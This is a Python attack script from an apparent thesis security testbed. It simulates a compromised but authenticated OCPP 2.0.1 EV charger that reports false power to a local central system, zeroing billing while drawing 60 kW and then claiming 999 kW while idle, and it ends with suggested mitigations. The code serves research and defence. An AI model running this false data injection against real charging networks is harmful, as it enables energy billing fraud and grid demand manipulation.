"""
===========================================================================
EVSecSim — OCPP 2.0.1 Attack: False Data Injection (survives 2.0.1)
===========================================================================

WHAT THIS IS
------------
The 2.0.1 re-implementation of Attack #2 (attacks/attack_fdi.py).  A
compromised-but-authenticated charger fabricates its reported power.  In
1.6 the lie rode in a MeterValues frame; in 2.0.1 it rides in a
TransactionEvent[Updated] frame — but the outcome is identical: the CSMS
logs the fabricated value with no plausibility check.

WHY IT STILL WORKS ON 2.0.1
---------------------------
FDI is an *authenticated-insider, data-integrity* attack.  The controls
2.0.1 adds — TLS, mutual-TLS, signed firmware — authenticate the channel
and the device; they say nothing about whether the reported data is
truthful.  OCPP 2.0.1 has no mandatory plausibility check on reported
power, and SignedMeterValue is optional and meter-hardware dependent.
A compromised charger holding a valid identity remains free to lie.

This holds REGARDLESS of security profile — moving to Profile 2/3 (TLS)
would not stop it, because the attacker IS the authenticated charger.

ISOLATED VARIABLE
-----------------
This track is 1.6-plaintext vs 2.0.1-plaintext: the ONLY thing that
changes from attack_fdi.py is the message model (TransactionEvent vs
MeterValues).  The attack surviving proves the vulnerability is in the
data layer, not the protocol version.

THREE PHASES (identical to the 1.6 version)
-------------------------------------------
  Phase 1 — Normal     : honest 60 / 0 kW              → CSMS matches reality
  Phase 2 — Under-report: draws 60 kW, reports 0 kW    → load hidden, billing zeroed
  Phase 3 — Over-report : idle, reports 999 kW         → phantom demand event

EVIDENCE
--------
  Attack terminal → REAL value (what the charger knows)
  CSMS terminal   → REPORTED value logged verbatim (what the operator sees)
  The gap between them = the attack working, unchanged by the 2.0.1 migration.

HOW TO RUN
----------
  docker compose --profile v201-fdi up
===========================================================================
"""

import asyncio
import os
import websockets
from datetime import datetime, timezone

from ocpp.v201 import ChargePoint as cp, call
from ocpp.v201.enums import RegistrationStatusEnumType

# ===========================================================================
# CONFIG
# ===========================================================================

CSMS_URL        = os.environ.get("CSMS_URL", "ws://127.0.0.1:9100")
CP_ID           = os.environ.get("CP_ID", "CP-201-1")
TX_ID           = "TX-201-FDI"

PHASE_DURATION  = 15      # seconds per phase
SEND_INTERVAL_S = 2

REAL_POWER_KW   = 60.0
IDLE_POWER_KW   = 0.0
FAKE_LOW_KW     = 0.0     # lie: idle while drawing 60 kW
FAKE_HIGH_KW    = 999.0   # lie: 999 kW while idle

# ===========================================================================
# COLOUR
# ===========================================================================

RED, YELLOW, GREEN, CYAN, BOLD, RESET = (
    "\033[91m", "\033[93m", "\033[92m", "\033[96m", "\033[1m", "\033[0m")

def ts():
    return datetime.now().strftime("%H:%M:%S")

def now():
    return datetime.now(timezone.utc).isoformat()

def log_normal(real, rep):
    match = "✓" if abs(real - rep) < 0.1 else "✗"
    print(f"[{ts()}] {GREEN}NORMAL  {RESET}| real={real:6.1f} kW | reported={rep:6.1f} kW | {match}")

def log_under(real, rep):
    print(f"[{ts()}] {YELLOW}UNDER   {RESET}| real={real:6.1f} kW | reported={rep:6.1f} kW | "
          f"{RED}HIDING {real - rep:.0f} kW from operator{RESET}")

def log_over(real, rep):
    print(f"[{ts()}] {RED}OVER    {RESET}| real={real:6.1f} kW | reported={rep:6.1f} kW | "
          f"{RED}FAKING {rep - real:.0f} kW phantom load{RESET}")

# ===========================================================================
# COMPROMISED 2.0.1 CHARGE POINT
# ===========================================================================

class CompromisedEVSEv201(cp):

    async def register(self) -> bool:
        resp = await self.call(call.BootNotification(
            charging_station={"model": "FDI-Demo-201", "vendor_name": "Compromised-Vendor"},
            reason="PowerUp",
        ))
        print(f"[{ts()}] Registered with 2.0.1 CSMS — status: {resp.status}")
        return resp.status == RegistrationStatusEnumType.accepted

    async def start_tx(self):
        await self.call(call.TransactionEvent(
            event_type="Started", timestamp=now(),
            trigger_reason="ChargingStateChanged", seq_no=0,
            transaction_info={"transaction_id": TX_ID},
        ))

    async def report(self, seq: int, power_kw: float):
        """Send a TransactionEvent[Updated] carrying the (possibly fake) power."""
        await self.call(call.TransactionEvent(
            event_type="Updated", timestamp=now(),
            trigger_reason="MeterValuePeriodic", seq_no=seq,
            transaction_info={"transaction_id": TX_ID},
            meter_value=[{
                "timestamp": now(),
                "sampledValue": [{
                    "value": round(power_kw, 2),
                    "measurand": "Power.Active.Import",
                    "unitOfMeasure": {"unit": "kW"},
                }],
            }],
        ))

    async def run_attack(self):
        if not await self.register():
            print("Registration failed — is the 2.0.1 CSMS running?")
            return

        await self.start_tx()

        print()
        print(f"{BOLD}{'='*62}{RESET}")
        print(f"{BOLD}  OCPP 2.0.1 FDI Attack — CP: {CP_ID}  (TransactionEvent){RESET}")
        print(f"{'='*62}")
        print(f"  real power  = what the charger draws")
        print(f"  reported    = what the 2.0.1 CSMS logs (no plausibility check)")
        print(f"{'='*62}\n")

        seq = 1

        # Phase 1 — honest
        print(f"{GREEN}{BOLD}PHASE 1 — NORMAL REPORTING ({PHASE_DURATION}s){RESET}\n")
        t = 0; toggle = True
        while t < PHASE_DURATION:
            real = REAL_POWER_KW if toggle else IDLE_POWER_KW
            log_normal(real, real)
            await self.report(seq, real); seq += 1
            await asyncio.sleep(SEND_INTERVAL_S); t += SEND_INTERVAL_S; toggle = not toggle
        print()

        # Phase 2 — under-report
        print(f"{YELLOW}{BOLD}PHASE 2 — UNDER-REPORTING ({PHASE_DURATION}s){RESET}")
        print(f"Charger draws {REAL_POWER_KW} kW. Reporting {FAKE_LOW_KW} kW to CSMS.\n")
        t = 0
        while t < PHASE_DURATION:
            log_under(REAL_POWER_KW, FAKE_LOW_KW)
            await self.report(seq, FAKE_LOW_KW); seq += 1
            await asyncio.sleep(SEND_INTERVAL_S); t += SEND_INTERVAL_S
        print()

        # Phase 3 — over-report
        print(f"{RED}{BOLD}PHASE 3 — OVER-REPORTING ({PHASE_DURATION}s){RESET}")
        print(f"Charger is idle. Reporting {FAKE_HIGH_KW} kW to CSMS.\n")
        t = 0
        while t < PHASE_DURATION:
            log_over(IDLE_POWER_KW, FAKE_HIGH_KW)
            await self.report(seq, FAKE_HIGH_KW); seq += 1
            await asyncio.sleep(SEND_INTERVAL_S); t += SEND_INTERVAL_S
        print()

        self._summary()

    def _summary(self):
        print(f"{BOLD}{'='*62}{RESET}")
        print(f"{BOLD}  OCPP 2.0.1 FDI complete — thesis evidence{RESET}")
        print(f"{'='*62}")
        print(f"  {GREEN}[Phase 1]{RESET} CSMS-v201 logs match attack terminal → baseline OK")
        print(f"  {YELLOW}[Phase 2]{RESET} CSMS-v201 logs 0 kW while charger draws 60 kW → FDI confirmed")
        print(f"  {RED}[Phase 3]{RESET} CSMS-v201 logs 999 kW on idle charger → phantom load confirmed")
        print()
        print(f"  Key finding : the data-integrity attack survives the 1.6 → 2.0.1")
        print(f"                message-model migration. TransactionEvent carries the")
        print(f"                lie exactly as MeterValues did; the 2.0.1 CSMS still")
        print(f"                logs it verbatim with no plausibility check.")
        print(f"  Independent of security profile — TLS/mutual-TLS authenticate the")
        print(f"  channel and device, not the truthfulness of the reported data.")
        print()
        print(f"  {CYAN}Residual mitigation (beyond OCPP):{RESET}")
        print(f"  - CSMS plausibility check: reported kW vs rated connector capacity")
        print(f"  - SignedMeterValue from a separate trusted meter module + CSMS verify")
        print(f"  - Cross-reference with substation SCADA / smart-meter data")
        print(f"{'='*62}")

# ===========================================================================
# MAIN
# ===========================================================================

async def main():
    print(f"Connecting to 2.0.1 CSMS at {CSMS_URL} as '{CP_ID}' ...")
    try:
        async with websockets.connect(CSMS_URL, ping_interval=None) as ws:
            await ws.send(CP_ID)
            evse = CompromisedEVSEv201(CP_ID, ws)
            start_task = asyncio.create_task(evse.start())
            await asyncio.sleep(0.1)
            await evse.run_attack()
            start_task.cancel()
            try:
                await start_task
            except (asyncio.CancelledError, websockets.exceptions.ConnectionClosedOK):
                pass
    except ConnectionRefusedError:
        print(f"Cannot reach 2.0.1 CSMS at {CSMS_URL}")


if __name__ == "__main__":
    asyncio.run(main())
